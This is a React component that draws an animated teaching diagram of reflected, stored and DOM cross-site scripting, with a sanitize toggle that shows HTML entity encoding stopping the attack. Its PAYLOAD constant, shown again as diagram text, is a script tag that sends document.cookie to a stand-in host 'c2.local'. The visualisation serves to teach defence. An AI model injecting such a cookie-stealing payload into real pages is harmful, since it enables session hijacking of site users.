import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Code2, ShieldAlert, ShieldCheck } from 'lucide-react';

const easeOut: [number, number, number, number] = [0.4, 0, 0.2, 1];
const trans = { duration: 0.4, ease: easeOut };

const PAYLOAD = '<script>fetch("http://c2.local/steal?c=" + document.cookie)</script>';

export function XssViz() {
  const [xssType, setXssType] = useState<'reflected' | 'stored' | 'dom'>('reflected');
  const [sanitized, setSanitized] = useState<boolean>(false);
  const [executionStep, setExecutionStep] = useState(0);
  const [isRunning, setIsRunning] = useState(false);

  const runExecution = () => {
    setExecutionStep(0);
    setIsRunning(true);
    const startTime = performance.now();
    const tick = (now: number) => {
      const elapsed = now - startTime;
      const step = Math.floor(elapsed / 500);
      setExecutionStep(Math.min(step, 4));
      if (step < 4) requestAnimationFrame(tick);
      else setIsRunning(false);
    };
    requestAnimationFrame(tick);
  };

  return (
    <div className="space-y-5 font-mono select-none w-full">
      <div className="flex items-center justify-between gap-2 p-3 rounded-xl bg-[#F7F7F7] dark:bg-[#141414] border border-[#E5E5E5] dark:border-[#2A2A2A]">
        <div className="flex items-center gap-2 overflow-x-auto">
          {(['reflected', 'stored', 'dom'] as const).map((t) => {
            const isActive = xssType === t;
            return (
              <button
                key={t}
                id={`xss-type-${t}`}
                type="button"
                onClick={() => setXssType(t)}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all duration-300 cursor-pointer border ${
                  isActive
                    ? 'bg-[#111111] dark:bg-white text-white dark:text-black border-[#111111] dark:border-white shadow-sm'
                    : 'bg-white dark:bg-[#1C1C1C] text-[#666666] dark:text-[#999999] border-[#E5E5E5] dark:border-[#2A2A2A] hover:border-[#111111] dark:hover:border-white'
                }`}
              >
                {t} XSS
              </button>
            );
          })}
        </div>

        <div className="flex items-center gap-2">
          <button
            id="xss-run-exec"
            type="button"
            onClick={runExecution}
            disabled={isRunning}
            className="px-3 py-1.5 rounded-lg bg-[#111111] dark:bg-white text-white dark:text-black font-bold text-xs uppercase transition-all duration-300 cursor-pointer border border-[#111111] dark:border-white disabled:opacity-50"
          >
            RUN PAYLOAD
          </button>
          <button
            id="xss-toggle-sanitize"
            type="button"
            onClick={() => setSanitized(!sanitized)}
            className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all duration-300 cursor-pointer border flex items-center gap-1.5 ${
              sanitized
                ? 'bg-[#333333] text-white border-[#333333] shadow-sm dark:bg-[#555555] dark:border-[#555555]'
                : 'bg-[#333333] text-white border-[#333333] shadow-sm dark:bg-[#555555] dark:border-[#555555]'
            }`}
          >
            {sanitized ? <ShieldCheck size={14} /> : <ShieldAlert size={14} />}
            {sanitized ? 'SANITIZED' : 'UNSANITIZED'}
          </button>
        </div>
      </div>

      <div className="relative rounded-2xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#101010] p-6 flex flex-col justify-between overflow-hidden min-h-[300px] shadow-sm">
        <svg viewBox="0 0 540 240" aria-label="XSS payload execution and sanitization" className="w-full max-h-[300px]">
          <motion.rect x="20" y="50" width="140" height="75" rx="10" fill="var(--bg-card)" stroke="var(--border-bright)" strokeWidth="2" animate={{ stroke: 'var(--border-bright)' }} transition={trans} />
          <text x="90" y="82" textAnchor="middle" fontSize="12" fontFamily="monospace" fill="var(--text-primary)" fontWeight="900">ATTACKER</text>
          <text x="90" y="100" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)">Injects Script</text>

          <motion.line x1="160" y1="87" x2="200" y2="87" stroke="var(--text-primary)" strokeWidth="2" strokeOpacity="0.4" strokeDasharray="4 4"
            animate={{ strokeDashoffset: [0, -10] }} transition={{ duration: 1, repeat: Infinity }} />

          <motion.rect
            x="200" y="50" width="140" height="75" rx="10"
            fill="var(--bg-card)"
            stroke={sanitized ? 'var(--border-bright)' : 'currentColor'}
            strokeWidth="2"
            animate={{ stroke: sanitized ? 'var(--border-bright)' : 'currentColor', strokeWidth: 2 }}
            transition={trans}
          />
          <motion.text
            x="270" y="82" textAnchor="middle" fontSize="12" fontFamily="monospace" fill="var(--text-primary)" fontWeight="900"
            key={`dom-${sanitized}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={trans}
          >
            VICTIM DOM
          </motion.text>
          <motion.text
            x="270" y="100" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)"
            key={`dom-state-${sanitized}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ ...trans, delay: 0.1 }}
          >
            {sanitized ? 'HTML Encoded (Safe)' : 'Executes JS Payload'}
          </motion.text>

          <AnimatePresence>
            {executionStep >= 2 && !sanitized && (
              <motion.g
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={trans}
              >
                <motion.text
                  x="270" y="135" textAnchor="middle" fontSize="9" fontFamily="monospace" fill="var(--text-primary)" fontWeight="800"
                  animate={{ opacity: [0.5, 1, 0.5] }}
                  transition={{ duration: 1.5, repeat: Infinity }}
                >
                  fetch("http://c2.local/steal?c=" + document.cookie)
                </motion.text>
              </motion.g>
            )}
          </AnimatePresence>

          <motion.line x1="340" y1="87" x2="380" y2="87" stroke="var(--text-primary)" strokeWidth="2" strokeOpacity="0.4" strokeDasharray="4 4"
            animate={{ strokeDashoffset: [0, -10] }} transition={{ duration: 1, repeat: Infinity, delay: 0.5 }} />

          <motion.rect
            x="380" y="50" width="140" height="75" rx="10"
            fill="var(--bg-card)"
            stroke={sanitized ? 'var(--border)' : 'currentColor'}
            strokeWidth="2"
            animate={{ stroke: sanitized ? 'var(--border)' : 'currentColor', strokeWidth: 2 }}
            transition={trans}
          />
          <motion.text
            x="450" y="82" textAnchor="middle" fontSize="12" fontFamily="monospace" fill="var(--text-primary)" fontWeight="900"
            key={`c2-${sanitized}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={trans}
          >
            C2 EXFIL
          </motion.text>
          <motion.text
            x="450" y="100" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)"
            key={`c2-state-${sanitized}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ ...trans, delay: 0.1 }}
          >
            {sanitized ? 'Blocked by CSP' : 'Cookie Stolen'}
          </motion.text>

          <AnimatePresence>
            {sanitized && (
              <motion.g
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={trans}
              >
                <rect x="150" y="170" width="240" height="24" rx="5" fill="var(--bg-card)" stroke="var(--border-bright)" strokeWidth="1.5" />
                <motion.text
                  x="270" y="187" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-primary)" fontWeight="800"
                  animate={{ opacity: [0.6, 1, 0.6] }}
                  transition={{ duration: 2, repeat: Infinity }}
                >
                  HTML ENTITY ENCODING ENFORCED
                </motion.text>
              </motion.g>
            )}
          </AnimatePresence>

          <AnimatePresence>
            {!sanitized && executionStep >= 3 && (
              <motion.g
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={trans}
              >
                <rect x="150" y="170" width="240" height="24" rx="5" fill="var(--bg-card)" stroke="currentColor" strokeWidth="1.5" />
                <motion.text
                  x="270" y="187" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-primary)" fontWeight="800"
                  animate={{ opacity: [0.5, 1, 0.5] }}
                  transition={{ duration: 1.5, repeat: Infinity }}
                >
                  EXECUTED DOCUMENT.COOKIE IN VICTIM BROWSER
                </motion.text>
              </motion.g>
            )}
          </AnimatePresence>
        </svg>
      </div>

      <AnimatePresence mode="wait">
        <motion.div
          key={`${xssType}-${sanitized}`}
          initial={{ opacity: 0, y: 8 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -8 }}
          transition={trans}
          className="p-5 rounded-xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#141414] space-y-3 shadow-xs"
        >
          <div className="flex items-center justify-between border-b border-[#E5E5E5] dark:border-[#2A2A2A] pb-3">
            <div className="flex items-center gap-2.5">
              <Code2 size={16} />
              <span className="text-sm font-extrabold uppercase tracking-wide text-[#111111] dark:text-white font-heading">
                DOM RENDERED OUTPUT
              </span>
            </div>
            <span className="text-xs font-bold text-[#888888] dark:text-[#777777] uppercase font-mono">
              TYPE: {xssType.toUpperCase()}
            </span>
          </div>

          <motion.code
            className="block p-4 rounded-lg bg-[#F7F7F7] dark:bg-[#181818] border border-[#E5E5E5] dark:border-[#2A2A2A] text-xs sm:text-sm font-mono text-[#111111] dark:text-white leading-relaxed font-bold"
            key={`code-${sanitized}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={trans}
          >
            {sanitized
              ? `<div>&lt;script&gt;fetch(...)&lt;/script&gt;</div>`
              : `<div>${PAYLOAD}</div>`}
          </motion.code>
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
